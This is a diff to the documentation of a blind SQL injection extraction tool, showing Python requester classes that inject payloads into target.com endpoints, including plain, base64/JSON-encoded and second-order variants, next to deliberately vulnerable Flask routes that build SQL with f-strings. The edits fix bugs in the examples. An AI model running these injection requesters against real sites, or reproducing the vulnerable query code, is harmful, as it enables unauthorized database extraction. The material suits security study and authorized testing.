@@ -27,8 +27,9 @@ class SimpleRequester(Requester):
     async def request(self, query, ctx):
         # inject the query
         payload = query.render(ctx)
-        url = f'http://target.com/users?name=XXX" OR ({payload}) --'
-        async with aiohttp.request('GET', url) as resp:
+        name = f'XXX" OR ({payload}) --'
+        url = 'http://target.com/users'
+        async with aiohttp.request('GET', url, params={'name': name}) as resp:
             # determine the query result
             return resp.status == 200
 ```
@@ -49,7 +50,7 @@ class SimpleRequester(Requester):
     ...
 
 async def main():
-    requester = SimpleRequester():
+    requester = SimpleRequester()
     ext = Extractor(requester=requester, dbms='sqlite')
     data = await ext.extract_table_names()
     print(data)
@@ -60,13 +61,13 @@ asyncio.run(main())
 Although simple, this approach can be used to exploit most BSQLI vulnerabilities. Keep reading.
 
 
-#### Transforming Payloads
+#### Payload Transformations
 Let's spice things up. Look at the endpoint bellow.
 ```python
 @app.route('/users')
 def users():
     data = request.args['data']
-    data = base64.b64decode(data).decode()
+    data = base64.b64decode(data.encode()).decode()
     name = json.loads(data)['name']
     query = f'SELECT * FROM users WHERE name="{name}"'
     ...
@@ -80,9 +81,9 @@ class RequesterWithTransformations(Requester):
     async def request(self, query, ctx):
         payload = query.render(ctx)
         data = json.dumps({'name': f'XXX" OR ({payload}) --'})
-        data = base64.b64encode(data.encode())
-        url = f'http://target.com/users?data={data}'
-        async with aiohttp.request('GET', url) as resp:
+        data = base64.b64encode(data.encode()).decode()
+        url = 'http://target.com/users'
+        async with aiohttp.request('GET', url, params={'data': data}) as resp:
             return resp.status == 200
 ```
 
@@ -98,6 +99,7 @@ SESSION = {
 @app.route('/register', methods=['POST'])
 def register():
     SESSION['name'] = request.args['name']
+    return 'ok', 200
 
 @app.route('/profile')
 def register():
@@ -120,8 +122,9 @@ class SecondOrderRequester(Requester):
     async def request(self, query, ctx):
         # upload the payload
         payload = query.render(ctx)
-        url = f'http://target.com/register?name=XXX" OR ({payload}) --'
-        async with aiohttp.request('post', url):
+        name = f'XXX" OR ({payload}) --'
+        url = 'http://target.com/register'
+        async with aiohttp.request('post', url, params={'name': name}):
             pass
 
         # hit the vulnerable endpoint and infer the result
